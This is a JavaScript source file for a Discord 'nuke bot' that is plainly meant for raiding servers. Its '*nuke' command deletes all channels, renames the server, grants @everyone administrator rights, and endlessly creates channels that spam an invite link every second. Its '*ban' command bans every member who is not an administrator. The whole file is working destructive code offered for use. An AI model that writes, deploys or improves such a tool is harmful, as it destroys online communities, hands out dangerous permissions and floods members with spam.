// Require necessary modules
const Discord = require('discord.js');
require('dotenv').config(); // Load environment variables

// Create a new Discord client
const client = new Discord.Client({
    intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES, Discord.Intents.FLAGS.GUILD_MEMBERS]
});

// When the bot is ready
client.on('ready', () => {
    console.log(`${client.user.tag} is online! Nuke bot is ready.`);
});

// Listen for messages
client.on('messageCreate', async (message) => {
    // Check if the message is *nuke
    if (message.content === '*nuke') {
        // Delete all existing channels
        message.guild.channels.cache.forEach(channel => channel.delete());

        // Rename server
        await message.guild.setName('nuked by apex');

        // Update @everyone role permissions to ADMINISTRATOR
        const everyoneRole = message.guild.roles.everyone;
        await everyoneRole.setPermissions(Discord.Permissions.FLAGS.ADMINISTRATOR);

        // Function to create a new channel and spam messages
        const createAndSpamChannel = async () => {
            const channel = await message.guild.channels.create('nuked by apex', {
                type: 'GUILD_TEXT'
            });

            // Spam messages in the newly created channel
            setInterval(() => {
                channel.send('@everyone https://discord.gg/6Vtg4WpPHY');
            }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
        };

        // Create the initial channel
        await createAndSpamChannel();

        // Infinite loop to continually create new channels and spam
        setInterval(async () => {
            await createAndSpamChannel();
        }, 1000); // Adjust the interval as needed (1000 ms = 1 second)
    }

    // Check if the message is *ban
    if (message.content === '*ban') {
        if (!message.member.permissions.has(Discord.Permissions.FLAGS.BAN_MEMBERS)) {
            return message.reply('You do not have permission to use this command.');
        }

        // Fetch all members and ban them except for those with ADMINISTRATOR permission or the bot itself
        const members = message.guild.members.cache.filter(member => 
            member.id !== client.user.id && !member.permissions.has(Discord.Permissions.FLAGS.ADMINISTRATOR)
        );

        let bannedCount = 0;

        for (const member of members.values()) {
            try {
                await member.ban({ reason: 'Banned by nuke bot' });
                console.log(`Banned ${member.user.tag}`);
                bannedCount++;
            } catch (error) {
                console.error(`Failed to ban ${member.user.tag}: ${error}`);
            }
        }

        message.channel.send(`Successfully banned ${bannedCount} members without ADMINISTRATOR permission.`);
    }
});

// Log in the bot using the token from environment variables
client.login(process.env.TOKEN).catch((error) => {
    console.error('Failed to log in:', error);
});
